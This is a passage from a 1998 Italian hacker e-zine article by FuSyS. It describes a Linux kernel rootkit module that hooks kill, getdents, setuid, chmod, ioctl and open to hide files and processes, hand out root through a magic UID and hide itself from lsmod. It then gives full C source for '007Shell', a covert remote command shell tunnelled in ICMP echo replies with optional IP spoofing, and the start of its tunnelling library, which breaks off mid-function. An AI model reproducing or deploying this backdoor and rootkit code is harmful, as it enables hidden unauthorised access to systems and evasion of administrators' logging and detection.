	sys_call_table[SYS_kill] = old_kill;
	sys_call_table[SYS_setuid] = old_setuid;
	sys_call_table[SYS_chmod] = old_chmod;
	sys_call_table[SYS_ioctl] = old_ioctl;
	sys_call_table[SYS_open] = old_open;
}


--------------------------- taglia qui -------------------------------------

Nel nostro modulo ci sono delle variabili che possono essere customizzate
a piacimento:

#define SUBVISUS        "007"
#define SIGNIHIL        31
#define FL_DISAPPEAR    0x70000000
#define SACROUID        7777
#define KING            501
#define OPENFILE        6666

SUBVISUS e' la stringa che, contenuta nei nomi file, ne impedisce la
visualizzazione con la chiamata di sistema getdents; quindi assolutamente
invisibili nelle letture del file system. Ovvio che anche /proc subisca lo
stesso trattamento, in modo che non appaia neanche con ps e top ....

SIGNIHIL e' il numero di segnale inviabile con kill(1). Se osserviamo
bene, il numero 31 e' inutilizzato sotto linux. Questo ci permette di
definirlo in modo che setti la flag FL_DISAPPEAR del processo da noi
prescelto con kill(1). Detto processo risultera' d'ora in poi invisibile
con ps e top.

SACROUID e' l'UID che, richiesto con la chiamata di sistema setuid, ci
fornisca privilegi root.

KING e' l'UID da noi prescelto che abbia in alcuni casi privilegi uguali a
root.

OPENFILE e' invece l'UID necessario ad avere pieno accesso con la chiamata
open nei riguardi dei file di sistema.

suser() e fsuser() servono per avere un ponte su cui basare altre chiamate
troiane; ad esempio sethostname basa il proprio flusso su questo tipo di
controllo. Inserite una chiamata che le sfrutti all'interno del modulo e
sara' sovvertita ...

Dopo abbiamo bisogno dei puntatori alle vecchie chiamate di sistema, che
vengono utilizzate per poter tornare i valori normali nel caso non venga
attivata la chiamata di troia:

int (*old_kill) (pid_t, int) ;
int (*old_getdents) (unsigned int, struct dirent *, unsigned int) ;
int (*old_setuid) (uid_t) ;
int (*old_chmod) (const char*, mode_t) ;
int (*old_ioctl) (unsigned int, unsigned int, unsigned long) ;
int (*old_open) (const char *, int, mode_t) ;

extern void *sys_call_table[] ;

Dopodiche' segue un'implementazione di atoi(3). Questo e' MOLTO
importante. No. Non atoi, ma il fatto che a livello kernel NON SI POSSA
USARE la libreria C standard. Se da un lato e' vero che alcune funzioni
sono state codate anche all'interno del kernel, la maggior parte delle
funzioni cui siamo abituati in user space va ricodata all'interno dei
nostri moduli.

Dopo abbiamo due funzioni prese da /usr/src/linux/fs/proc/array.c di sana
pianta:

struct task_struct *get_task(pid_t pid)
static inline char *task_name(struct task_struct *p, char *buf)

Queste sono necessarie per poter correlare i nomi ed i pid dei processi
alle strutture vere e proprie. Insieme a 

int secret(pid_t pid)

ci serviranno per poter giocare con getdents e kill per poter nascondere
file e processi alla vista del sistema.

La funzione int killinv(pid_t pid) serve invece per capire se abbiamo
assegnato la FL_DISAPPEAR ad un processo mediante il segnale SIGNIHIL.

CHIAMATE DI SISTEMA (ED I LORO CAVALLI DI TROIA)

GETDENTS
========

Abbastanza semplice. Mostrato sia da Zarq che da Plaguez. Usiamo il
puntatore alla vecchia getdents per leggere i dati. Vediamo se stiamo
leggendo in proc. Poi se effettivamente abbiamo qualcosa in mano creiamo
altre due strutture di tipo dirent. Allochiamo memoria nel kernel per la
seconda struttura e copiamo in essa i bytes letti nella prima. Valutiamo
poi quel che abbiamo messo da parte. Se contenga istanze di SUBVISUS
oppure nel caso ci si trovi in /proc se le funzioni secret e killinv
ritornino positivamente. A questo punto filtriamo le informazioni e le
ritorniamo nella prima dirent.

KILL
====

Questo e' simpatico. Zarq ha mostrato come 'smaterializzare' i processi
mediante l'uso di un nuovo segnale, in modo che venga settata una flag
in task->flags. Facile come bere fornire la possibilita' di variare i
permessi del processo prescelto se il segnale inviato e' ad esempio
SIGTSTP. Interessante notare che il ^Z funzioni ancora. Se il segnale
viene inviato con kill(1) avremo la metamorfosi da $ a # .

SETUID
======

OK. HalfLife docet. Un bel unistd.h e setuid(SACROUID) nel vostro codice e
avrete la possibilita' di gustare i piaceri di root.

CHMOD
=====

Nessun potere particolare. Solo la possiblita' di variare i permessi di
accesso ai file come preferite. /etc/passwd e /etc/shadow due ovvi e
banali obiettivi.

IOCTL
=====

OK. Plaguez docet. Installate uno sniffer. Installate il modulo. Niente
piu' flag PROMISC. Ovvio che possiate modificare il codice per usi
analoghi su altri device ....

OPEN
====

Come chmod tutto sommato. Niente di esagerato. Solo che qui avete accesso
diretto. Occhio che i file creati avranno 'u' root. Ma potete variare i
permessi nel modulo.

OK MA COME FACCIO ?!

Per dirottare dobbiamo associare le vecchie chiamate ai puntatori che
abbiamo fornito. E poi inserire le nostre chiamate nell'array
sys_call_table ..... in modo che queste vengano eseguite. All'interno
delle nostre potremo servirci dei servizi legali del kernel mediante i
puntatori alle vecchie. Alla disinstallazione del modulo ripristineremo le
normali chiamate nell'array. Abbastanza semplice. Un grosso grazie ad
HalfLife ovviamente.

Per evitare di mostrare in /proc/ksyms, leggibile con ksyms(1), le nuove
chiamate offerte dal modulo basta registrarle come NULL nella funzione
register_symtab() .

Per nasconderle invece a lsmod il discorso si fa ostico. Plaguez ne ha
gia' parlato in PHRACK. Una soluzione e' ad opera di Solar Designer ed
altri ..... azzerare i campi della struttura mp di tipo module.

Per far questo dobbiamo azzeccare il registro in cui si punta a tale
struttura. Nel codice dell'articolo ho lasciato %ebp. Ho notato che tutte
le volte che ho installato il modulo questo registro mi ha permesso di
nascondere il mio modulo. MA .......

Ci sono 2 MA.

1) questo ha annullato le referenze a tutti i moduli precedentemente
   caricati.

2) trovare il registro esatto vuol dire andare per tentativi e puo'
   buttare giu' il sistema durante i tentativi stessi.

Un altro modo e' abbastanza ovviamente usare il 'solito' metodo:
sostituire ad un modulo legale il nostro, facendo in modo che esso possa
poi caricarne il codice relativo. O semplicemente mascherare i nomi del
modulo e delle nuove chiamate in modo che si presenti come codice innocuo.

OKI. E ORA ?

Questo modulo vi terra' li dentro. Ma non vi fara' 'tornare'. Per far
questo bisogna codare una backdoor come quella proposta da Plaguez. Solo
che nel modulo di PHRACK, la back basata sul pacchetto IP ad hoc, e'
praticamente inutilizzabile vista la sua instabilita' a livello kernel.

L'altro modo proposto e' dirottare la chiamata execve verso un altro file.
Questo permetterebbe di usare demoni troiani senza dover sostituire il
file vero e proprio. Anche qui il codice e' abbastanza instabile. Prima di
rilasciare un update sulla home di BFI voglio essere sicuro che funzioni.
Questo per evitare misteriosi shutdown a catena di server linux ..... =:)
Quindi intanto il modulo CaRoGNa e' completo. 

							FuSyS

#############################################################################
NOTA:	Come specificato nella testa del codice, questo modulo e' frutto
	del mio piacere e della mie ricerche. Delle mie letture e del mio
	tempo libero. Il fine e' quello dell'informazione. Non della
	sovversione. Ogni utilizzo non conforme e' affare vostro. Non
	lo stimo ne' lo incito. Ma come la redazione di PHRACK, mi
	siedero' a guardare.
#############################################################################

Testi consigliati:

	W.R.Stevens	Advanced Programming in the UNIX Environment 
	M.Beck et al.	Linux Kernel Internals 2nd ed.	


------------------------------[ PR0GETT0 NiNJA ]------------------------------
---------------------[ tratto da: TCP/iP T00LS UNLiMiTED ]--------------------
-----------------------------------[ FuSyS ]----------------------------------

NO (C)1998 fusys
A scopo informativo e ludico. L'autore ha una sola richiesta. Che l'utente
finale utilizzi contemporaneamente il cervello, oltre a questi strumenti.
In caso contrario, uscite dalla shell, mollate la tastiera e andate
immediatamente a RTFM. Si, la F e' vietata ai minori. =)  

NINJA.
Scaltro ... Letale ... Ingegnoso ... Oscuro ... Nascosto nell'ombra :) 
Si, lo so che sono fissato con le ombre, l'occultamento e l'oscurita'.
Che ci devo fare ?! Ad ogni modo, con questo progetto si rimane nell'
ambito dell'occultamento, delle backdoor e del sovvertimento.

OBIETTIVO #1

Rientrare o non Rientrare. Questo non e'il problema. Il problema e'il LOG.
Un log in messages, uno in secure, una bella voce nuova nell'output di
netstat(8) ... no ragazzi, cosi' non si fa. E' solo questione di tempo
prima che l'admin se ne accorga. Pochi numeri di PHRACK fa, il solito
Daemon9 ci ha messo al corrente di quello che comunque gia' si sapeva.
Nel set dei protocolli TCP/IP, ci sono alcune 'zone ombra' create ad hoc
per contenere dei dati. Ovviamente quei dati sono attesi e ben definiti in
RFC ed email della IETF ... ma altrettanto ovviamente noi possiamo
utilizzare SOCK_RAW non solo per variare il TTL nell'uso di traceroute.

[ Van Jacobson forse non lo immaginava, o forse si, poco importa, ma il suo
bel patch per il raw protocol ha dato sostanza alle speculazioni di Morris
di qualche anno prima. ]

Quindi, perche' non crearci il nostro bel pacchetto IP, costruendo un
opportuno header a seconda del protocollo scelto ? E perche' non infilare
in quelle zone ombra dei dati diversi da quelli attesi ?

Immaginate: voglio inviare delle email PRIVATE ma sono totalmente paranoico
e non mi fido della sola crittografia. Voglio assicurarmi anche del canale
di trasmissione. So che tra il mio host ed il sistema remoto ci sono degli
spioni all'opera con potenti sniffer. Sono alla ricerca di ogni pacchetto
verso e dalla porta 25 del mio sistema. Tengono d'occhio ogni connessione
TCP e UDP.

A questo punto inserisco le mie mail all'interno di altri protocolli che
ortodossamente non dovrebbero contenere questo tipo di dati. E li cripto
anche :) ... il sistema remoto dovra' ovviamente avere le carte giuste in
mano per ricevere questi dati.

Ora che i piu' tranquilli sono incuriositi ed a posto con la coscienza,
immaginiamo la possibilita' di avere una shell remota su di un sistema,
senza doverci connettere nei modi usuali .... lo stdin, stdout e stderr
della nostra shell sono passati all'interno di protocolli insospettati
senza dare luogo ad una vera e propria connessione che netstat(8) possa
vedere come tale. Ovviamente manchera' l'affidabilita' delle connessioni
TCP.

Quindi il primo obiettivo del progetto NiNJa e' una shell remota occultata
senza doversi connettere all'host remoto. Il codice accluso serve per
poter funzionare da client e server di questa shell. Il nome e' molto
simpaticamente (sigh!) 007Shell ... =)

OBIETTIVO #2

La ricerca del protocollo e' stata semplice. Daemon9 l'aveva gia' scelto.
Scherzi a parte e' abbastanza ovvia come scelta. Tra i protocolli che
saltano all'occhio per questo compito, il piu' ovvio e' ICMP. Questo
infatti e' alla base del buon vecchio ping(8) che tutti abbiamo usato
almeno una volta. Oltretutto sono ancora pochi gli admin sgamati che hanno
sostituito il loro kernel con un ICMP daemon, o che hanno deciso di
filtrare buona parte dei messaggi di ICMP; o che sono comunque dotati di
firewall intelligenti anche per gli ECHO_REQUEST ad esempio. Dall'interno
del muro di fuoco dovranno pur pingare l'esterno ogni tanto. Qui ci
inseriamo noi, occultando i dati della nostra shell all'interno dei
messaggi ECHO_REPLY (i ping di ritorno). Nella maggior parte dei casi
passeranno ;)

Ho pensato pero' che anche altri programmini potessero usufruire di un
simile occultamento. Quindi il secondo regalo del progetto NiNJa e' un
bell'ICMPLIB_V1.h che contiene l'implementazione dell'occultamento dati in
ICMP in maniera trasparente all'utente, occupandosi della creazione e
dell'invio/ricezione dei pacchetti. L'idea deriva dal lavoro dell'autore
di Sniffit, Brecht, che mi ha ispirato con il suo header per lo spoofing.

Prima di mostrare il codice, ritengo sia importante delucidare le idee su
ICMP e sull'idea alla base dell'occultamento dei dati in esso.
Questo per chi non ha potuto leggere la bibbia in tre volumi sul set
TCP/IP : TCP/IP Illustrated. Consigliata (almeno i volumi uno e due) a
tutti i coder di rete; a spada tratta, occhi chiusi e senza mani :)

* ICMP - Internet Control Message Protocol *

Questo protocolllo viene spesso considerato come parte dello strato IP.
Comunica messaggi di errore od altre condizioni che richiedano attenzione.
Questi messaggi sono spesso attivati da IP o dai protocolli degli strati
piu' alti, TCP e UDP. Alcuni di questi messaggi causano l'invio di
messaggi di errore ai processi utente.

I messaggi ICMP sono trasmessi in datagrammi IP :

	<--------------------- datagramma IP ----------------------->
	
	-------------------------------------------------------------
	|		|					    |
	|  IP Header	|	      Messaggio ICMP		    |
	|		|					    |
	-------------------------------------------------------------
	    20 bytes

La specifica ufficiale e' contenuta nell'RFC 792.

Vediamo ora il diagramma di un tipico messaggio ICMP.

	0		7 8	      15 16			   31
	-------------------------------------------------------------
	|   8-bit type   |  8-bit code  |     16-bit checksum	    |
	-------------------------------------------------------------
	|							    |
	/	il contenuto varia a seconda di type e code	    /
	|							    |
	-------------------------------------------------------------

A seconda del valore di type abbiamo una serie di 15 differenti messaggi
ICMP, alcuni dei quali contengono dei sottomessaggi a seconda del valore
di code. In /usr/include/linux/icmp.h abbiamo:

#define ICMP_ECHOREPLY          0       /* Echo Reply                   */
#define ICMP_DEST_UNREACH       3       /* Destination Unreachable      */
#define ICMP_SOURCE_QUENCH      4       /* Source Quench                */
#define ICMP_REDIRECT           5       /* Redirect (change route)      */
#define ICMP_ECHO               8       /* Echo Request                 */
#define ICMP_TIME_EXCEEDED      11      /* Time Exceeded                */
#define ICMP_PARAMETERPROB      12      /* Parameter Problem            */
#define ICMP_TIMESTAMP          13      /* Timestamp Request            */
#define ICMP_TIMESTAMPREPLY     14      /* Timestamp Reply              */
#define ICMP_INFO_REQUEST       15      /* Information Request          */
#define ICMP_INFO_REPLY         16      /* Information Reply            */
#define ICMP_ADDRESS            17      /* Address Mask Request         */
#define ICMP_ADDRESSREPLY       18      /* Address Mask Reply           */

/* Codes for UNREACH. */
#define ICMP_NET_UNREACH        0       /* Network Unreachable          */
#define ICMP_HOST_UNREACH       1       /* Host Unreachable             */
#define ICMP_PROT_UNREACH       2       /* Protocol Unreachable         */
#define ICMP_PORT_UNREACH       3       /* Port Unreachable             */
#define ICMP_FRAG_NEEDED        4       /* Fragmentation Needed/DF set  */
#define ICMP_SR_FAILED          5       /* Source Route failed          */
#define ICMP_NET_UNKNOWN        6
#define ICMP_HOST_UNKNOWN       7
#define ICMP_HOST_ISOLATED      8
#define ICMP_NET_ANO            9
#define ICMP_HOST_ANO           10
#define ICMP_NET_UNR_TOS        11
#define ICMP_HOST_UNR_TOS       12
#define ICMP_PKT_FILTERED       13      /* Packet filtered */
#define ICMP_PREC_VIOLATION     14      /* Precedence violation */
#define ICMP_PREC_CUTOFF        15      /* Precedence cut off */
#define NR_ICMP_UNREACH 15        /* instead of hardcoding immediate value */

/* Codes for REDIRECT. */
#define ICMP_REDIR_NET          0       /* Redirect Net                 */
#define ICMP_REDIR_HOST         1       /* Redirect Host                */
#define ICMP_REDIR_NETTOS       2       /* Redirect Net for TOS         */
#define ICMP_REDIR_HOSTTOS      3       /* Redirect Host for TOS        */

/* Codes for TIME_EXCEEDED. */
#define ICMP_EXC_TTL            0       /* TTL count exceeded           */
#define ICMP_EXC_FRAGTIME       1       /* Fragment Reass time exceeded */

Non tutti i messaggi sono passati ai processi utente che abbiano definito
dei socket di tipo raw in attesa. Ad esempio mentre Linux passa ai
processi utente (dopo averli onorati a livello kernel) anche gli ICMP_ECHO
lo stesso non si puo' dire di altri unix che seguano l'implementazione
4.4BSD .... i messaggi che ogni implementazione dovrebbe passare anche ai
socket di processi utente sono:

ICMP_ECHOREPLY, ICMP_TIME_EXCEEDED e ICMP_ADDRESSREPLY.

I messaggi di tipo ECHO possono contenere dati opzionali necessari alle
opzioni di tipo Record Route (RR) e TimeStamp. A questo proposito
leggetevi la man page di ping(8). Questi dati possono essere scritti nell'
apposito campo icmp_data, secondo la struttura di tipo icmp dell'header
linux_ip_icmp, preso dalla distro di tcpdump :

struct icmp {
        u_char  icmp_type;              
        u_char  icmp_code;              
        u_short icmp_cksum;             
        union {
                u_char ih_pptr;                 /* ICMP_PARAMPROB */
                struct in_addr ih_gwaddr;       /* ICMP_REDIRECT */
                struct ih_idseq {
                        n_short icd_id;
                        n_short icd_seq;
                } ih_idseq;
                int ih_void;
        } icmp_hun;
#define icmp_pptr       icmp_hun.ih_pptr
#define icmp_gwaddr     icmp_hun.ih_gwaddr
#define icmp_id         icmp_hun.ih_idseq.icd_id
#define icmp_seq        icmp_hun.ih_idseq.icd_seq
#define icmp_void       icmp_hun.ih_void

        union {
                struct id_ts {
                        n_time its_otime;
                        n_time its_rtime;
                        n_time its_ttime;
                } id_ts;
                struct id_ip  {
                        struct ip idi_ip;
                        /* options and then 64 bits of data */
                } id_ip;
                u_long  id_mask;
                char    id_data[1];
        } icmp_dun;
#define icmp_otime      icmp_dun.id_ts.its_otime
#define icmp_rtime      icmp_dun.id_ts.its_rtime
#define icmp_ttime      icmp_dun.id_ts.its_ttime
#define icmp_ip         icmp_dun.id_ip.idi_ip
#define icmp_mask       icmp_dun.id_mask
#define icmp_data       icmp_dun.id_data
};

Ora appare chiaro come sia possibile copiare dati all'interno di icmp_data
e creare quindi dei pacchetti ad hoc da inviare ad altri sistemi. Per far
questo dobbiamo utilizzare i socket di tipo raw. Ovvio che anche il
sistema remoto dovra' per forza di cose gestire raw socket per ricevere i
pacchetti e leggerne il contenuto.

ECHOREPLY e' la nostra scelta piu' ovvia: viene passato in raw su ogni
implementazione. E la maggior parte dei firewall ne consentono il
passaggio. ICMPInfo di default non logga i vari ECHO/ECHOREPLY. netstat(8)
non potra' visualizzare alcuna connessione stabile, se non la presenza di
un nuovo socket raw.

RAW 

Mi spiace ma non son qui per dirvi come gestire i raw sockets. Leggetevi
la mia lib. Leggetevi il codice di quasi tutti i nuovi DOS di rete ...
Ovvero ... RTFM =))))

Ad ogni modo li utilizziamo per gestire l'invio e la ricezione di
pacchetti sintetici creati con una bella iniezione di dati occultati.
Dobbiamo ovviamente gestire l'header ICMP per quanto riguarda il checksum,
il type, e _data. Il kernel pensera' ad aggiungere l'header IP opportuno.
Questo ovviamente lascera' una bella sfilza di icmp: echoreply dal vostro
solito caro e rompiscatole IP. Per questo ho codato anche la possibilita'
di mandare i pacchetti specificando il nostro header IP con un bell'IP
sorgente spoofato per non dare troppo nell'occhio. Altrettanto ovvio pero'
che non vedrete l'output dei vostri comandi, visto che il remoto non avra'
modo di inserire il vostro IP reale nella struttura sockaddr_in ; anche se
e' sicuramente possibile inviare un primo pacchetto che contenga il nostro
IP normale scritto in uno con IP spoofato.

Esaurita questa concisa spiegazione vediamo il codice di 007Shell :

--------------------------- taglia qui ----------------------------------- 

/*
 * 007Shell.c	v.1.0		Covert Shell Tunnelling in ICMP 0x00 ECHO
 *				REPLY message types. Works by putting
 *				data streams in the ICMP message past the  
 *				usual 4 bytes (8-bit type, 8-bit code and
 *				16-bit checksum).
 *				Please note that is also possible to use
 *				0x08 ECHO or 0x0D TIMESTAMPREPLY. And ICMP 
 *				is not the only protocol in which we can
 *				tunnel data.
 *				It simply is so common to let ICMP ECHO
 *				REPLY slip through firewalls and not to
 *				log it.
 *
 * Thanks and ShoutOuts:
 *			      -	For further infos check the LOKI project
 *				by Daemon9. Hey, seems really that r00t
 *				owns us all :)
 *
 * Compile with:		make  ( Life is nice, eh ?! ;P )
 *
 *				NO(C)1998 FuSyS
 */

#include <stdio.h>
#include <unistd.h>
#include "ICMPLIB_V1.h"

#define YEAH		1
#define NOPE		0
#define BUFFSIZE	512
#define OFFLINE		"snafuz!"
#define ROOTDIR		"/tmp"

void usage(char *code)
{
	fprintf(stderr,"\n\033[1;34mUsage:\033[0m \033[0;32m%s \033[0m\033[1;34m-s|-c [-h host] [-S spoofed_source_IP]\033[0m\n\n", code);
        exit(0);
}


int main(int argc, char **argv)
{
	char data[MAXMESG] ;
	char recvdata[MAXMESG+BUFFSIZE] ;
	char senddata[MAXMESG+BUFFSIZE] ;
	
	int opt, off = 0, n, i ;
	int srvr = 0, clnt = 0 ;
	int pid, ret ;
	u_long hostaddress, cliaddress ;
	char buf[BUFFSIZE] ;
	char buf2[BUFFSIZE] ;

	FILE *job ;

	if (argc < 2) usage(argv[0]);

	while ((opt = getopt(argc, argv, "sch:S:")) != EOF) {
		switch(opt)
		{
			case 's':
			  srvr++;
			  break;

			case 'c':
			  clnt++;
			  break;

			case 'h':
			  hostaddress = nameResolve(optarg);
			  break;

			case 'S':
			  ip_spoof = YEAH;
			  spoof_addr = nameResolve(optarg);
			  break;

			default:
			  usage(argv[0]);
		}
	}

	if (srvr)
	strcpy(argv[0], "007Shell v.1.0 - Good Luck James ...");

	if (!hostaddress && clnt) {
		fprintf(stderr, "\n\033[0;5;31mYou must specify the server address\033[0m\n\n");
		exit(0);
	}

	if (clnt && !srvr) {

	   printf("\033[0;32m007Shell v.1.0 - Let's Dig Covert !\033[m\n");

	   while (!ferror(stdin) && !feof(stdin)) {
		bzero(senddata, sizeof(senddata));
		bzero(recvdata, sizeof(recvdata));
		
		printf("\033[0;32m[covert@007Shell]# \033[0m");

	      	if (fgets(data, MAXMESG, stdin) == NULL)
			break;

		data[strlen(data)-1] = 0;

    		if(strstr(data, OFFLINE)) off = 1 ;

		strcat(senddata, data);

	      if(ip_spoof == NOPE) {
	   	if( ICMP_send(senddata, strlen(senddata), hostaddress, 0, 0) < 0) {
			perror("\033[0;5;31mTunnel_Send: \033[0m");
			exit(0);
	   	}
	      
	   	if (off && clnt) {
			ICMP_reset();
			printf("\033[0;32mSee ya Covert, James ...\033[0m\n");
			exit(0);
		}

		while(1) {
		   memset(recvdata, '\0', strlen(recvdata));
 		   if((n=ICMP_recv(recvdata, MAXMESG, REPLY)) != -666) { 
	   		printf("%s", recvdata);
		   } else break;
		}
	     }
	     if(ip_spoof == YEAH) {
		if( ICMP_sp_send(senddata, strlen(senddata), hostaddress,
			spoof_addr) < 0) {
			perror("\033[0;5;31mTunnel_Send: \033[0m");
                	exit(0);
                }
		if (off && clnt) {
                        ICMP_reset();
                        printf("\033[0;32mSee ya Covert, James ...\033[0m\n");
                        exit(0);
                }		 
	     }
	   }
	}
	 
	else if(srvr && !clnt) {
	   	pid = fork();
	   	if (pid != 0) {
			printf("\033[0;32m007Shell v.1.0 - Let's Go Covert !\033[0m\n");
			exit(0);
		}

	   	setsid();
	   	chdir(ROOTDIR);
	   	umask(0);
	  	
	  while(!off) {
		ret = 0;
		bzero(senddata, sizeof(senddata));
                bzero(recvdata, sizeof(recvdata));

	  	if((n=ICMP_recv(recvdata, MAXMESG, 0)) < 0) {
			perror("\033[0;5;31mTunnel_Recv: \033[0m");
			exit(0);
		}
		cliaddress = clisrc.sin_addr.s_addr;
	
		if(strstr(recvdata, OFFLINE)) {
			ICMP_reset();
			exit(0);
		}
		if (!(job = popen(recvdata, "r"))) {
	                perror("\033[0;5;31Popen: \033[0m");
                        exit(0);
                }
		while(fgets(buf, BUFFSIZE-1, job)) {
			ret++;
			bcopy(buf, buf2, BUFFSIZE);
			ICMP_send(buf2, strlen(buf2), cliaddress, REPLY, 0);
	   	}
			ICMP_send("", 0, cliaddress, 0, LAST);
		pclose(job);
		fflush(NULL);
	   }
    	}

	ICMP_reset();
	exit(1);
}

--------------------------- taglia qui -----------------------------------

Dal README di 007Shell.tgz si legge:

" Questo e' un semplice codice basato sulla libreria ICMPLIB_V1.h .
In pratica: sul sistema remoto lanciate con 007Shell -s , mentre in locale
usatela in modalita' client con 007Shell -c -h indirizzo_del_sistema_remoto.
In questa versione avrete l'output dal sistema remoto dei vostri comandi.
Oppure potete usare l'opzione -S seguita dal nome host o indirizzo IP da
cui volete che origini il vostro pacchetto ICMP. Un bell'IP spoofing per
evitare di evidenziare il proprio indirizzo. Spoofing alla cieca pero' in
quanto non potrete vedere l'output dei vostri comandi. "


Per quanto riguarda il sorgente: partiamo dall'ovvio (ma non troppo ;).

#include "ICMPLIB_V1.h"

se non usate il tgz contenente oltre al sorgente anche questa mia libreria
ed il linux_ip_icmp.h non compilerete mai il programma :) ... siete
avvertiti.

#define OFFLINE         "snafuz!"
#define ROOTDIR         "/tmp"

Con OFFLINE definiamo la stringa necessaria alla chiusura SIA del client
che del server 007:

if(strstr(data, OFFLINE)) off = 1 ;
if (off && clnt) {
	ICMP_reset();
        printf("\033[0;32mSee ya Covert, James ...\033[0m\n");
        exit(0);
}

e per il server:

if(strstr(recvdata, OFFLINE)) {
	ICMP_reset();
        exit(0);
} 

ROOTDIR invece setta la directory all'interno della quale la shell 'ha
luogo'. Perche' /tmp ?! Beh, se nessuno di voi ha mai dato per sbaglio un
rm -rf * , allora mi ritiro su un eremo :) .... Almeno cosi' i danni
sono limitati. 

I comandi per la shell sono letti con un semplice

if (fgets(data, MAXMESG, stdin) == NULL) break;

dopodiche' vengono inviati con:

strcat(senddata, data);
if( ICMP_send(senddata, strlen(senddata), hostaddress, 0, 0) < 0 ) {
	perror("\033[0;5;31mTunnel_Send: \033[0m");
        exit(0);
}

nel caso di ICMP incapsulati in datagrammi IP creati normalmente dal
kernel, oppure, in caso di IP Spoofing, con:

if( ICMP_sp_send(senddata, strlen(senddata), hostaddress, spoof_addr) < 0)
{
        perror("\033[0;5;31mTunnel_Send: \033[0m");
        exit(0);
}

Se vi state chiedendo cosa siano questi vari \033[ etc etc allora leggete
la man page di ls(1) alla voce Display Colorization. Oppure lanciate
007Shell. Molti di voi avranno visto un simile uso dell'emulazione
terminale di Linux con Nestea V.2

Il client dopo aver inviato i comandi attende l'output degli stessi da
parte del server (non in caso di IP Spoofing) mediante un semplice ciclo
while:

while(1) {
	memset(recvdata, '\0', strlen(recvdata));
        if((n=ICMP_recv(recvdata, MAXMESG, REPLY)) != -666) {
        	printf("%s", recvdata);
        } else break;
}

La parte sottostante le funzionalita' server assume le usuali
caratteristiche del demone Unix, prima forkando e poi dando:

setsid();
chdir(ROOTDIR);
umask(0);

Dopodiche' riceve prima il pacchetto e poi, determinato l'IP del client lo
inserisce in una struttua sockaddr_in:

if((n=ICMP_recv(recvdata, MAXMESG, 0)) < 0) {
	perror("\033[0;5;31mTunnel_Recv: \033[0m");
        exit(0);
}
cliaddress = clisrc.sin_addr.s_addr;

Il semplice modo con cui il server esegue nella shell i comandi inviati
sfrutta le funzionalita' di popen(3):

if (!(job = popen(recvdata, "r"))) {
	perror("\033[0;5;31Popen: \033[0m");
        exit(0);
}

Poi invia lo stdout e stderr indietro al client fintanto che questi
determinano uno stream positivo:

while(fgets(buf, BUFFSIZE-1, job)) {
	ret++;
        bcopy(buf, buf2, BUFFSIZE);
        ICMP_send(buf2, strlen(buf2), cliaddress, REPLY, 0);
}
ICMP_send("", 0, cliaddress, 0, LAST);
pclose(job);
fflush(NULL);

Questo e' a grandi linee il flusso del codice di 007Shell. Ovvio che se vi
guardate il sorgente stesso e lo fate girare capirete molto meglio il
tutto.

Passiamo ora alla libreria:

--------------------------- taglia qui -----------------------------------

/*
########## ICMPLIB_V1.h ##################################################
######################## ICMP Tunneling Library ##########################
####################################################### by FuSyS #########

	    V.1 - NO (C)1998 FuSyS - TCP/IP Tools Unlimited

**************************************************************************
*  COSA:	Una libreria in standard C per sfruttare la possibilita' *
*		offerta dal protocollo ICMP di inserire dati all'interno *
*		del datagramma.						 *
*									 *
*  CHI:		individui dotati di una conoscenza base di C e TCP/IP 	 *
*		che siano abbastanza fantasiosi da trovare un uso per	 *
*		questo tipo di codice. Se non avete questi requisiti, 	 *
*		per favore impadronitevene prima di tornare a questa     *
*		lib.							 *
*									 *
*  OS:		Linux 1.3.x e seguenti (raw sockets)			 *
*									 *
*  TNX:		Daemon9 e THC per i loro lavori				 *
*                                                                        *
*  LETTURE:	TCP/IP Illustrated Vol.1 di R.W.Stevens, 		 * 
*		Project LOKI di Daemon9,				 *
*		/usr/include/*.h					 *
**************************************************************************

**************************************************************************
* FUNZIONI								 *
*									 *
* void ICMP_init(void);	 	- inizializza il tunnel ICMP -		 *
*									 *
* int  ICMP_send(char *send_mesg, size_t mesglen, u_long dest_ip,	 *
*		 int echo, int last);					 *
*				- invia i dati nel datagramma -		 *
*		 send_mesg :	dati da inviare				 *
*		 mesglen   :	lunghezza di send_data			 *
*		 dest_ip   :	l'IP cui mandare il datagramma		 *
*		 echo	   :	1 se il datagramma contiene l'echo del	 *
*				server					 *
*		 last	   :	1 se il datagramma e' l'ultimo di una 	 *
*				serie					 *
*                                                                        *
* int  ICMP_sp_send(char *send_mesg, size_t mesglen, u_long dest_ip,	 *
*		    u_long sp_ip);					 *
*				- invia spoofando l'IP sorgente -	 *
*                send_mesg :    dati da inviare                          *
*                mesglen   :    lunghezza di send_data                   *
*                dest_ip   :    l'IP cui mandare il datagramma           *
*		 sp_ip	   :	l'IP da spoofare			 *
*									 *
* int  ICMP_recv(char *recv_mesg, size_t mesglen, int echo);		 *
*				- riceve il datagramma -		 *
*		recv_mesg  :	dati in ricezione			 *
*		mesglen	   :	lunghezza di recv_data			 *
*		echo	   :	1 se riceviamo l'echo dal server	 *
*                                                                        *
* void ICMP_reset(void); - resetta il tunnel ICMP - 			 *
*                                                                        *
*************************************************************************/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <errno.h>
extern int errno;

#include <sys/types.h>
#include <sys/time.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/file.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>

#ifdef linux
  #include "linux_ip_icmp.h"
#else
  #include <netinet/ip_icmp.h>
  #include <netinet/ip.h>
#endif

#include <arpa/inet.h>
#include <netdb.h>

#define ECHO_TAG       0xF001
#define ECHO_LAST      0xF002
#define REPLY           1
#define LAST            1
#define YEAH		1
#define NOPE		0

#define ICMP_HDR        	8      	/* 8-byte ICMP header */
#define IP_HDR	    		20	/* 20-byte IP header */
#define MAXMESG           	4096    /* dati max*/
#define MAXPACKET         	5004    /* dimensioni max del pacchetto */
                                    	/* ICMP_HDR + MAXMESG */

	int     sockfd ;
	int 	ip_spoof ;
	u_long	spoof_addr ;
	u_int  	icmp_init = 1 ;
	struct 	sockaddr_in  clisrc;

/************************************************************************
* Funzioni per DNS e checksum - sempre le solite :) niente di nuovo qui	*
************************************************************************/

u_long  nameResolve(char *hostname);
char    *hostLookup(u_long in);
u_short in_chksum(u_short *ptr, int nbytes);

u_long nameResolve(char *hostname)
{
  struct in_addr addr;
  struct hostent *hostEnt;

  if((addr.s_addr=inet_addr(hostname)) == -1)
  {
    if(!(hostEnt=gethostbyname(hostname)))
    {
      	fprintf(stderr,"Errore nella risoluzione del nome:`%s`\n",hostname);
	exit(0);
    }
